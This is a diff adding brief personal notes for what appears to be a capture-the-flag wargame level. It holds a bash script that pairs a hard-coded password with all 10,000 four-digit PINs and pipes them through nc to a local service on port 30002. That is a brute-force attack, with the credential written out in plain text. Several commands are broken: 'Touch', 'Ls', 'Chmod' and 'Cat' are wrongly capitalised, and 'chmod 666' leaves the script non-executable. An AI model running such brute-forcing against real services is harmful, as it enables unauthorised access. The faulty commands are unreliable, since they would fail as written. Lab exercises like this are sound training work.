@@ -1,0 +1,21 @@
+nc localhost 30002
+mkdir /tmp/pinNum
+cd /tmp/pinNum
+Touch pinCheck.sh
+Vim pinCheck.sh
+
+Shell script
+1 #!/bin/bash       
+  2 p24=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+  3                   
+  4 for i in {0000..9999}
+  5  do               
+  6     echo $p24 $i >> combo.txt                                                                     
+  7  done             
+  8  
+
+Ls -l pinCheck.sh
+Chmod 666 pinCheck.sh
+Ls -l pinCheck.sh
+./pinCheck.sh
+Cat combo.txt| nc localhost 30002
